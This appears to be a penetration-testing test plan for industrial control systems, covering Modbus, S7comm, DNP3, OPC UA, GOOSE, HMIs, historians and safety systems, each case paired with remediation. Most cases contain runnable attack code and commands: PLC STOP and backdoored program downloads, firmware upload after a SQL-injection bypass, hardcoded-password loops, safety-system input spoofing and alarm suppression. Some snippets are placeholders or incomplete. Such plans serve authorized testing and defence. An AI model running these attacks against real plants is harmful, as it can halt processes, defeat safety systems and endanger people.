# CPS Attack — Test Cases

> Structured test case templates for validating CPS attack coverage. Each case includes severity, prerequisites, test steps, expected results, remediation, pass criteria, and reference payload.

## Conventions

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Prerequisites**: Required access, accounts, or pre-conditions
- **Pass Criteria**: Objective conditions indicating the test passes
- **Reference**: Pointer to the specific section in `payloads.md`

**OT-Specific Caveats**: Active scanning can crash fragile PLCs. Always test in staging first. Coordinate all writes with operations team. Never test SIS bypass without explicit written approval.

---

## A. Reconnaissance & Discovery

### TC-CPS-001 — PLC Vendor Fingerprint

**Severity**: LOW
**Prerequisites**: OT network reachability

**Test Steps**:
1. Passive capture: `tcpdump -i eth0 -w ot.pcap`
2. Identify vendor by port + protocol:
   ```bash
   nmap -p 502,44818,102,20000,4840,47808,2404 --max-rate 10 10.0.0.5
   ```
3. For each open port, run vendor-specific identification:
   - `nmap --script modbus-discover -p 502 10.0.0.5`
   - `nmap --script enip-info -p 44818 10.0.0.5`
   - `nmap --script s7-info -p 102 10.0.0.5`
   - `nmap --script bacnet-info -p 47808 10.0.0.5`

**Expected Results**:
- Vendor + model + firmware identified for each device

**Remediation**:
- Disable version disclosure where possible
- Filter vendor-specific ports at firewall

**Pass Criteria**: Identified vendor + model for ≥3 devices

**Reference**: payloads.md §1

---

### TC-CPS-002 — Modbus Register Enumeration

**Severity**: MEDIUM
**Prerequisites**: Modbus TCP reachability

**Test Steps**:
1. Read coils (FC 01): `mbpoll -m tcp -a 1 -r 0 -c 100 -t 0 10.0.0.5`
2. Read discrete inputs (FC 02): `mbpoll -m tcp -a 1 -r 0 -c 100 -t 1 10.0.0.5`
3. Read holding registers (FC 03): `mbpoll -m tcp -a 1 -r 0 -c 100 -t 3 10.0.0.5`
4. Read input registers (FC 04): `mbpoll -m tcp -a 1 -r 0 -c 100 -t 4 10.0.0.5`
5. Identify stable vs changing values (setpoints vs sensors)

**Expected Results**:
- Complete register map with semantically meaningful values

**Remediation**:
- Modbus gateway with auth + audit in front of PLCs
- Read-only mode for non-essential hosts

**Pass Criteria**: Catalogued ≥100 meaningful register addresses

**Reference**: payloads.md §2.2

---

### TC-CPS-003 — OPC UA Endpoint Security Enumeration

**Severity**: MEDIUM
**Prerequisites**: OPC UA server reachability

**Test Steps**:
1. Enumerate endpoints: `opcua-cli endpoints opc.tcp://10.0.0.5:4840`
2. Identify security policy: `None` is high-risk
3. Identify user token policy: anonymous is high-risk
4. Attempt anonymous browse: `opcua-cli browse opc.tcp://10.0.0.5:4840`

**Expected Results**:
- Hardened: `SignAndEncrypt` + username/cert token
- Vulnerable: `None` + anonymous token

**Remediation**:
- Enforce `SignAndEncrypt` security policy
- Disable anonymous access
- Use certificate-based user tokens

**Pass Criteria**: Identified security policy + user token policy

**Reference**: payloads.md §5

---

## B. Initial Access

### TC-CPS-004 — HMI Web Auth Bypass

**Severity**: CRITICAL
**Prerequisites**: HMI web admin URL

**Test Steps**:
1. Identify HMI web admin: `curl -sk https://10.0.0.5/admin`
2. Try SQL injection in login:
   ```bash
   curl -sk -X POST 'https://10.0.0.5/api/login' \
     -d '{"username":"admin","password":"'"'"' OR '"'"'1'"'"'='"'"'1"}' \
     -H 'Content-Type: application/json'
   ```
3. If successful, attempt firmware upload:
   ```bash
   curl -sk -X POST 'https://10.0.0.5/api/firmware/upload' \
     -H 'Authorization: Bearer $TOKEN' \
     -F 'file=@backdoor.bin'
   ```

**Expected Results**:
- Hardened: SQL injection blocked; WAF in front
- Vulnerable: logged in as admin

**Remediation**:
- Parameterized queries in HMI login
- WAF in front of HMI web
- HMI web disabled by default; behind VPN

**Pass Criteria**: Authenticated as admin via injection

**Reference**: payloads.md §14

---

### TC-CPS-005 — Engineering Workstation Phishing

**Severity**: HIGH
**Prerequisites**: Authorized phishing campaign

**Test Steps**:
1. Craft lure: TIA Portal project file as email attachment
2. Send to engineering workstation user
3. Track open / execute
4. If executed: pivot via workstation to OT network

**Expected Results**:
- Hardened: email filtering, app allowlist
- Vulnerable: workstation compromised

**Remediation**:
- Email filtering: block `.ap17`, `.ACD`, `.stu` attachments
- App allowlist: only TIA Portal, Studio 5000
- Engineering workstation: no email, no internet

**Pass Criteria**: Engineering workstation compromised

**Reference**: payloads.md §12

---

### TC-CPS-006 — Modbus Unauth Write

**Severity**: CRITICAL
**Prerequisites**: Direct Modbus TCP reachability

**Test Steps**:
1. Identify Modbus TCP port: `nmap -p 502 10.0.0.5`
2. Read current value: `mbpoll -m tcp -a 1 -r 40001 -c 1 10.0.0.5`
3. Write new value:
   ```python
   from pyModbusTCP.client import ModbusClient
   c = ModbusClient(host='10.0.0.5', port=502)
   c.open()
   c.write_single_register(40001, 1337)
   ```
4. Verify: `mbpoll -m tcp -a 1 -r 40001 -c 1 10.0.0.5`

**Expected Results**:
- Hardened: Modbus gateway with auth; write requires login
- Vulnerable: write succeeded

**Remediation**:
- Modbus gateway (e.g., Claroty, Nozomi) with auth
- Read-only mode for monitoring hosts
- Firewall: only authorized hosts reach port 502

**Pass Criteria**: Changed PLC setpoint via unauth Modbus write

**Reference**: payloads.md §2.4

---

## C. Privilege Escalation

### TC-CPS-007 — PLC STOP via S7comm

**Severity**: CRITICAL
**Prerequisites**: S7comm reachability, protection level bypass

**Test Steps**:
1. Connect to PLC:
   ```python
   from snap7.client import Client
   c = Client()
   c.connect('10.0.0.5', 0, 1)
   print(f'State: {c.get_cpu_state()}')
   ```
2. Send STOP command:
   ```python
   c.plc_stop()
   print(f'After stop: {c.get_cpu_state()}')
   ```

**Expected Results**:
- Hardened: STOP blocked by protection level; alerts operator
- Vulnerable: PLC halts; physical process stops

**Remediation**:
- Protection level 3 with strong password
- Network segmentation
- Audit log for STOP commands

**Pass Criteria**: PLC state changes to STOP

**Reference**: payloads.md §6.3

---

### TC-CPS-008 — PLC Program Download

**Severity**: CRITICAL
**Prerequisites**: Engineering access to PLC

**Test Steps**:
1. Read existing program:
   ```python
   from snap7.client import Client
   c = Client()
   c.connect('10.0.0.5', 0, 1)
   ob1 = c.upload('OB1')
   ```
2. Patch OB1 with backdoor logic
3. Download patched OB1:
   ```python
   c.download('OB1', patched_ob1)
   ```

**Expected Results**:
- Hardened: download requires authentication; version control
- Vulnerable: arbitrary code on PLC

**Remediation**:
- PLC password protection (level 3)
- Version control on PLC program (git)
- Audit log for program downloads

**Pass Criteria**: Modified PLC program executed

**Reference**: payloads.md §6.4

---

### TC-CPS-009 — DNP3 Outstation Command Injection

**Severity**: CRITICAL
**Prerequisites**: DNP3 reachability without auth

**Test Steps**:
1. Identify DNP3 outstation: `nmap -p 20000 10.0.0.5`
2. Connect without auth:
   ```python
   import asyncio
   from pydnp3 import opendnp3
   async def main():
       channel = opendnp3.get_tcp_channel('10.0.0.5', 20000)
       master = channel.add_master(...)
       await master.begin()
       # Operate (write) to binary output
       await master.operate(opendnp3.OpType.LATCH_ON, 0)
   asyncio.run(main())
   ```

**Expected Results**:
- Hardened: DNP3-secure (Aggressive Mode) enabled
- Vulnerable: control command executed

**Remediation**:
- Enable DNP3-secure authentication
- Restrict port 20000 to known master IPs
- Audit log for control commands

**Pass Criteria**: Changed binary output state

**Reference**: payloads.md §3

---

## D. Protocol-Level Attacks

### TC-CPS-010 — EtherNet/IP CIP Identity Spoofing

**Severity**: MEDIUM
**Prerequisites**: EtherNet/IP reachability

**Test Steps**:
1. Capture CIP Identity request via Wireshark
2. Forge response with attacker vendor / serial:
   ```python
   from scapy.all import Ether, IP, TCP, sendp
   # Construct CIP Identity response with attacker values
   packet = (Ether(src='attacker-mac') / IP(src='10.0.0.5') /
             TCP(sport=44818, flags='PA') /
             b'attacker-cip-identity-payload')
   sendp(packet, loop=1, inter=1)
   ```

**Expected Results**:
- SCADA system shows wrong vendor / serial for target

**Remediation**:
- Use EtherNet/IP security (CIP Security)
- Audit CIP Identity against device inventory

**Pass Criteria**: SCADA inventory shows spoofed identity

**Reference**: payloads.md §4

---

### TC-CPS-011 — OPC UA Anonymous Browse

**Severity**: HIGH
**Prerequisites**: OPC UA server with anonymous token

**Test Steps**:
1. Identify anonymous token: `opcua-cli endpoints opc.tcp://10.0.0.5:4840`
2. Browse anonymously: `opcua-cli browse opc.tcp://10.0.0.5:4840`
3. Read sensitive tag: `opcua-cli read opc.tcp://10.0.0.5:4840 --node "ns=2;s=ProcessValue"`

**Expected Results**:
- Hardened: anonymous token disabled
- Vulnerable: tag values exposed

**Remediation**:
- Disable anonymous token
- Require username or certificate auth

**Pass Criteria**: Read ≥10 sensitive tags anonymously

**Reference**: payloads.md §5.2

---

### TC-CPS-012 — IEC 61850 GOOSE Manipulation

**Severity**: CRITICAL
**Prerequisites**: Layer 2 access to IEC 61850 network

**Test Steps**:
1. Capture GOOSE: `tcpdump -i eth0 ether dst 01:0c:cd:01:00:01 -w goose.pcap`
2. Identify dataset, stNum, sqNum
3. Forge GOOSE with higher stNum:
   ```python
   from scapy.all import Ether, sendp
   packet = (
       Ether(dst='01:0c:cd:01:00:01') /
       GOOSE(appID=0x0001, stNum=999, sqNum=1, gooseData=[1])
   )
   sendp(packet, iface='eth0', loop=1, inter=0.001)
   ```

**Expected Results**:
- Hardened: IEDs reject high-stNum attacker GOOSE (if config requires cryptographic auth)
- Vulnerable: IEDs accept attacker values

**Remediation**:
- IEC 62351 security on GOOSE
- VLAN isolation
- Audit GOOSE source

**Pass Criteria**: IEDs accepted attacker-controlled values

**Reference**: payloads.md §11.2

---

### TC-CPS-013 — IEC 60870-5-104 Interrogation

**Severity**: HIGH
**Prerequisites**: 104 server reachability

**Test Steps**:
1. Identify 104 server: `nmap -p 2404 10.0.0.5`
2. Connect without auth:
   ```python
   import c104
   client = c104.Client('10.0.0.5', 2404)
   client.connect()
   # Read all data
   client.interrogate()
   ```

**Expected Results**:
- Hardened: TLS or auth required
- Vulnerable: full data read

**Remediation**:
- IEC 62351 security
- Restrict port 2404 to known master IPs

**Pass Criteria**: Read ≥100 process values

**Reference**: payloads.md §11.3

---

## E. Vendor-Specific Attacks

### TC-CPS-014 — Siemens S7comm Protection Bypass

**Severity**: HIGH
**Prerequisites**: Siemens S7-300/400/1500 PLC

**Test Steps**:
1. Connect via snap7:
   ```python
   from snap7.client import Client
   c = Client()
   c.connect('10.0.0.5', 0, 1)
   ```
2. Try to read DB without password (should fail at L3)
3. Try CVE-2019-19469 password bypass (S7-1500):
   ```python
   # Crafted S7comm request bypasses password check
   c.set_param(b'\x00' * 256, ...)
   ```
4. Read DB1

**Expected Results**:
- Hardened: bypass patched
- Vulnerable: DB read without password

**Remediation**:
- Patch to firmware ≥ 2.5
- Network segmentation
- Strong PLC password

**Pass Criteria**: Read DB without password

**Reference**: payloads.md §6.2

---

### TC-CPS-015 — Rockwell ControlLogix CVE-2024-6184

**Severity**: CRITICAL
**Prerequisites**: ControlLogix 5580 / CompactLogix 5380

**Test Steps**:
1. Identify affected model: `nmap --script enip-info -p 44818 10.0.0.5`
2. Exploit auth bypass to read project file:
   ```python
   python3 kali_rockwell_bypass.py --target 10.0.0.5
   ```

**Expected Results**:
- Hardened: patched firmware
- Vulnerable: project file (.ACD content) read without auth

**Remediation**:
- Patch firmware
- Network segmentation
- CIP Security

**Pass Criteria**: Project file read without auth

**Reference**: payloads.md §8

---

### TC-CPS-016 — Schneider Quantum Hardcoded Credentials

**Severity**: CRITICAL
**Prerequisites**: Schneider Quantum PLC

**Test Steps**:
1. Try hardcoded credentials:
   ```bash
   for pw in 'firefighter@somewhere' 'py8jdc@s5mb1' 'uucve@h6rbq'; do
     curl -sk -X PUT 'http://10.0.0.5/ws/UserName' \
       -d "{\"UserName\":\"Administrator\",\"Password\":\"$pw\"}" \
       | grep -q 200 && echo "GOT: $pw" && break
   done
   ```

**Expected Results**:
- Hardened: credentials rotated
- Vulnerable: default creds work

**Remediation**:
- Rotate default credentials
- Patch firmware (Schneider SA-2023-XX)

**Pass Criteria**: Logged in with hardcoded password

**Reference**: payloads.md §7.3

---

## F. Engineering Workstation

### TC-CPS-017 — TIA Portal Project File Theft

**Severity**: HIGH
**Prerequisites**: Engineering workstation access

**Test Steps**:
1. Locate TIA Portal project:
   ```bash
   find / -name '*.ap17' -o -name '*.ap16' -o -name '*.ac17' 2>/dev/null
   ```
2. Parse with TIA parser:
   ```bash
   python3 kali_tia_parser.py --project /path/to/proj.ap17
   ```
3. Extract PLC passwords, IPs, network config

**Expected Results**:
- Hardened: project files encrypted at rest
- Vulnerable: cleartext passwords in project

**Remediation**:
- Project file encryption (TIA Portal feature)
- EFS / BitLocker on workstation
- Workstation login MFA

**Pass Criteria**: Extracted PLC passwords from project

**Reference**: payloads.md §12

---

### TC-CPS-018 — Studio 5000 Project File

**Severity**: HIGH
**Prerequisites**: Engineering workstation access

**Test Steps**:
1. Locate Studio 5000 project: `find / -name '*.ACD' -o -name '*.MER' 2>/dev/null`
2. Extract PLC program source: `python3 kali_acd_parser.py --file proj.ACD`
3. Identify PLC passwords, tag DBs, rungs

**Expected Results**:
- Hardened: project encrypted
- Vulnerable: source extracted

**Remediation**:
- Studio 5000 project encryption
- Workstation hardening

**Pass Criteria**: Extracted source from .ACD

**Reference**: payloads.md §12

---

## G. SCADA Historian

### TC-CPS-019 — PI System Bulk Read

**Severity**: HIGH
**Prerequisites**: PI Server reachability

**Test Steps**:
1. Identify PI Server: `nmap -p 5450 scada.example.com`
2. Connect as piadmin (often weak password):
   ```bash
   python3 kali_pi_sdk.py --server scada.example.com --user piadmin --pass ''
   ```
3. Enumerate tags: `> SELECT tag FROM pipoint..classic`
4. Bulk read history:
   ```sql
   SELECT tag, time, value FROM piarchive..picomp2
   WHERE time > 'y-1y' AND tag LIKE 'PUMP_%'
   ```

**Expected Results**:
- Hardened: strong passwords, role-based access
- Vulnerable: bulk data exfil

**Remediation**:
- Strong PI admin password
- Per-tag ACL
- Audit bulk reads

**Pass Criteria**: Pulled ≥1 year of historical data

**Reference**: payloads.md §13

---

### TC-CPS-020 — SQL Server Historian

**Severity**: HIGH
**Prerequisites**: SQL Server reachability

**Test Steps**:
1. Identify SQL Server: `nmap -p 1433 scada-db.example.com`
2. Connect via sqsh:
   ```bash
   sqsh -S scada-db.example.com -U historian_user -P REPLACE_WITH_YOUR_PW
   ```
3. Enumerate databases:
   ```sql
   1> SELECT name FROM master.sys.databases
   2> go
   ```
4. Dump recent data:
   ```sql
   1> SELECT TOP 1000 * FROM History ORDER BY Timestamp DESC
   2> go
   ```

**Expected Results**:
- Hardened: least privilege, SQL auth disabled
- Vulnerable: bulk data exfil

**Remediation**:
- Least-privilege SQL account
- Windows auth only
- Audit queries

**Pass Criteria**: Read ≥1000 rows of process data

**Reference**: payloads.md §13.2

---

## H. SIS Bypass

### TC-CPS-021 — SIS Modbus Spoof

**Severity**: CRITICAL
**Prerequisites**: SIS network access (rare — usually requires explicit approval)

**Test Steps**:
1. **CAUTION**: Test in isolated lab first. Live SIS bypass can cause catastrophic damage.
2. Identify SIS PLC: `nmap -p 502 10.0.0.50`
3. Force SIS input register:
   ```python
   from pyModbusTCP.client import ModbusClient
   c = ModbusClient(host='10.0.0.50', port=502)
   c.open()
   c.write_single_register(30001, 5000)  # spoof safe pressure
   ```
4. Observe SIS reaction

**Expected Results**:
- Hardened: SIS isolated from BPCS; no Modbus write access
- Vulnerable: SIS sees spoofed safe values

**Remediation**:
- SIS on physically separate network
- No write access to SIS from non-SIS hosts
- Periodic SIS logic validation

**Pass Criteria**: SIS did not trip when reality was unsafe

**Reference**: payloads.md §17

---

## I. OT-to-IT Pivot

### TC-CPS-022 — Engineering Workstation Dual-Homed Pivot

**Severity**: HIGH
**Prerequisites**: Engineering workstation access

**Test Steps**:
1. Identify dual-homed workstation: `ip addr show`
2. Identify both interfaces (OT and IT)
3. Pivot to IT: `ssh user@192.168.1.10` (IT host)
4. Pivot to OT: `ssh user@10.0.0.5` (PLC)

**Expected Results**:
- Hardened: workstation single-homed or firewall-enforced segregation
- Vulnerable: bidirectional pivot

**Remediation**:
- Engineering workstation single-homed during OT ops
- Bridge-mode firewall between OT and IT
- Audit cross-network traffic

**Pass Criteria**: Pivot in both directions via workstation

**Reference**: payloads.md §16

---

### TC-CPS-023 — Historian Linked Server Pivot

**Severity**: HIGH
**Prerequisites**: Historian DB access

**Test Steps**:
1. Connect to historian: `sqsh -S historian -U hist_user -P $PW`
2. Enumerate linked servers: `1> EXEC sp_linkedservers`
3. Pivot to linked server:
   ```sql
   1> SELECT * FROM [data-warehouse].dbo.CustomerPII
   2> go
   ```

**Expected Results**:
- Hardened: no linked servers to IT
- Vulnerable: linked server to IT data warehouse

**Remediation**:
- No linked servers between OT and IT DBs
- Use ETL with one-way push, not bidirectional links

**Pass Criteria**: Read IT data from historian DB

**Reference**: payloads.md §16

---

## J. Persistence

### TC-CPS-024 — Hidden Function Block in PLC Program

**Severity**: HIGH
**Prerequisites**: PLC program download permission

**Test Steps**:
1. Read existing OB1
2. Insert hidden function block (triggered by specific input)
3. Download new OB1
4. Test trigger: write to specific input → backdoor activates

**Expected Results**:
- Hardened: program comparison detects change
- Vulnerable: backdoor executes

**Remediation**:
- Continuous program comparison (vendor tools)
- Hash of PLC program daily
- Audit downloads

**Pass Criteria**: Backdoor activates on trigger

**Reference**: payloads.md §15.3

---

### TC-CPS-025 — Backdoor HMI Account

**Severity**: MEDIUM
**Prerequisites**: HMI admin access

**Test Steps**:
1. Identify HMI web admin
2. Create new admin user with non-obvious name
3. Verify access via new user
4. Survives HMI reboot?

**Expected Results**:
- Hardened: HMI user audit weekly; alert on new user
- Vulnerable: backdoor persists

**Remediation**:
- HMI user list audit
- Alert on user create
- 2-person rule for admin user creation

**Pass Criteria**: Backdoor user survives reboot

**Reference**: payloads.md §14

---

## K. Defense Evasion

### TC-CPS-026 — Sensor Spoofing + Alarm Suppression

**Severity**: CRITICAL
**Prerequisites**: Modbus write + HMI access

**Test Steps**:
1. Read current sensor value: `mbpoll -m tcp -a 1 -r 30001 10.0.0.5`
2. Read current alarm threshold: `mbpoll -m tcp -a 1 -r 40001 10.0.0.5`
3. Write spoofed safe value to sensor register
4. Raise alarm threshold (so alarm doesn't trip)
5. Observe HMI: should show normal operation

**Expected Results**:
- Hardened: independent alarm channels; engineer mode required for threshold change
- Vulnerable: operator sees "all OK"

**Remediation**:
- Independent alarm system
- Threshold changes require engineer mode + audit
- Sensor validation via second channel

**Pass Criteria**: HMI shows normal operation while reality is unsafe

**Reference**: payloads.md §2.4, §14

---

## L. Detection Validation

### TC-CPS-027 — Detect Modbus Write Anomaly

**Severity**: MEDIUM
**Prerequisites**: Detection tooling deployed

**Test Steps**:
1. Establish baseline Modbus traffic
2. Perform uncharacteristic Modbus write (new address, new source)
3. Verify detection tool (Claroty/Dragos/Nozomi) alerts
4. Verify Sigma rule fires

**Expected Results**:
- Detection tool alerts on anomaly

**Remediation**:
- Tune detection rules to reduce false positives
- Add Sigma rules for known attack patterns

**Pass Criteria**: Detection tool generated alert within 60s

**Reference**: payloads.md §19

---

## Aggregate Pass Criteria

A successful engagement covers at minimum:
- **≥6 test cases passed across ≥3 protocols** (Modbus, EtherNet/IP, OPC UA, DNP3, S7comm, BACnet)
- **≥1 CRITICAL case per protocol demonstrating full breach chain**
- **≥1 vendor-specific CVE finding** (Siemens / Rockwell / Schneider)
- **≥1 OT-to-IT pivot finding**
- **≥1 HMI web finding**
- **≥1 detection rule** for at least one demonstrated attack
- **SIS bypass tested only with explicit written approval**
- **Persistence mechanism** documented

---

## Reporting Template

```markdown
### TC-CPS-XXX — <Case Title>

**Status**: PASS / FAIL / PARTIAL
**Target**: <PLC vendor / model / firmware>
**Window**: <start> - <end> UTC
**Operator**: <name>
**Operations coordination**: <name> (for any writes)

**Findings**:
- <bullet points>

**Evidence**:
- PCAP: <path>
- PLC program: <path>
- HMI logs: <REDACTED>
- Operator confirmation: <REDACTED>

**Impact**:
- <process stopped / sensor spoofed / SIS bypassed>
- <production loss estimate>
- <safety risk>

**Remediation**:
1. <short-term>
2. <medium-term>
3. <long-term>

**Detection Rule**:
<sigma / zeek / suricata>

**References**:
- Vendor advisory: <URL>
- MITRE ATT&CK ICS: <technique>
```

---

## References

- MITRE ATT&CK for ICS — https://collaborate.mitre.org/attackics/
- CISA ICS Advisories — https://www.cisa.gov/ics-advisories
- Dragos — Year in Review 2024
- Claroty — Top 50 ICS Vulnerabilities 2024
- Nozomi Networks — Industrial IoT Threat Landscape 2024
- Siemens CERT — https://cert-portal.siemens.com/
- Rockwell PSIRT — https://rockwellautomation.custhelp.com/
- Schneider CERT — https://www.se.com/ww/en/work/support/cybersecurity/security-notifications
- SANS ICS — https://ics.sans.org/
- "Industrial Network Security" (Knapp, Langill) 4th Edition 2024
- "Hacking Exposed ICS" (Pidgeon, 2024)
- NIST SP 800-82r3 — ICS Security Guide
- ANSI/ISA-99 / IEC 62443
- CISA AA23-335A — Unitronics PLC Attack
- CISA AA23-320A — Industroyer2
- Dragos — Pipedream / Incontroller
- Claroty — FrostyGoop
